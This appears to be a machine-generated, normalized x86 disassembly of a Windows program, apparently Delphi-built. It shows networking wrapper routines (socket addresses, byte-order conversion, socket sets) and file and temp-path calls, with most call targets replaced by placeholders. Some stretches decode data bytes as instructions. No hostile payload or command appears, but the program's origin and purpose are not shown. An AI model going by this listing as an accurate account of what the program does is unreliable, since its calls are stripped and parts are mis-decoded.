lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46a258
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_4697fc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46a2b4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_404318
or edx 0xffffffff
mov eax esi
call sub_4697fc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46a304
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_40476c
mov eax [ ebx ]
call sub_4043e0
push eax
mov eax [ ebx ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_4045e0
mov edx eax
mov eax ebx
call sub_404318
pop ebx
retn
sub_46a34c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_46a368
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46a3f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_404174
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a3fa
lea eax [ ebp - 0x1c ]
call sub_404120
retn
sub_46a404
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_41b810
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_41b4f8
add ebx 0x4
dec esi
jne r-xdata
sub_46a440
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46a4d5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a4dc
lea eax [ ebp - 0xc ]
call sub_404120
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41b654
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_46a4e4
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402da4
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402da4
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402da4
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46a440
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46a440
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46a440
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46a404
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46a404
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46a404
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46a5fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_46a618
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402da4
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_469d80
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46a684
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_46a6a4
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0xc ] eax
sub_46a704
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46a7d1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_40399c#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4086fc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a7d8
lea eax [ ebp - 0x10 ]
call sub_404120
retn
sub_46a7f7
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_46a901
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4054a4
xor eax eax
push ebp
push j_sub_403870#7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_404318
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_4054e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a908
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4054a4
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404318
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_46a8cb
mov eax [ ebp - 0x4 ]
call sub_403390
call sub_403bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a908
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4054a4
retn
sub_46a92c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_46a9c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_4697fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9cd
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404144
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_46a9d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46a9f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_46aaa6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46aa89
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aa90
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_46aab8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_46ab7b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46b2d4
mov eax [ ebp - 0x8 ]
call sub_4086fc
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46b2d4
mov eax [ ebp - 0xc ]
call sub_4086fc
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46b2d4
mov eax [ ebp - 0x10 ]
call sub_4086fc
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46b2d4
mov eax [ ebp - 0x14 ]
call sub_4086fc
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ab82
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404144
retn
sub_46aba0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ac2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_4697fc
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_404174
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac35
lea eax [ ebp - 0x18 ]
call sub_404120
retn
sub_46ac40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46acce
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_4697fc
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_404174
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46acd5
lea eax [ ebp - 0x18 ]
call sub_404120
retn
sub_46ace0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_46ad00
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_46ad5a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ad61
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
sub_46ad68
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_46adc2
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46adc9
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_46add0
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_46ae04
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46aea5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_469948
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aeac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_4092d8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404174
sub_46aeb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46aeed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aef4
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_46af24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46af49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af50
retn
sub_46b180
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b1df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_40476c
mov eax [ ebx ]
call sub_4045e0
push eax
mov eax [ ebx ]
call sub_4043e0
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_40476c
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_46b088
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b1e6
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_46b1ec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b2b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_40452c
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_408108
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408108
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_404724
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404640
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_404174
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2bc
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404144
retn
push ebx
mov eax edi
call sub_4043e0
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404640
mov eax ebx
call sub_404120
jmp r-xdata
sub_46b2d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_46b1ec
mov eax esi
mov edx r-xdata
call sub_40452c
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_404724
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404640
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_404174
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_4043e0
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404640
jmp r-xdata
mov eax ebx
call sub_404120
jmp r-xdata
sub_46b37b
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
fwait
xchg ebx eax
stc
inc ebx
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b43f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b446
retn
mov eax rw-data
call sub_40d7a0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
call sub_404120
mov eax rw-data
mov edx [ r-xdata ]
call sub_4054a4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4054a4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bd4
sub_46b448
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_46b51b
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b522
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea eax [ ebp - 0x4 ]
call sub_46b180
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404174
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402ec8
jne r-xdata
mov eax sub_40c964
mov [ rw-data ] eax
mov [ rw-data ] r-xdata
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404174
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404174
sub_46b664
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b689
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b690
retn
sub_46b87c
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423aa8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46b8ee
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b8f5
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_46993c
mov edx [ rw-data ]
mov [ edx ] eax
sub_46b914
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40375c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_423af4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46b97b
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b982
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d7a0
sub_46b994
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_46b9cc
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46b9fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
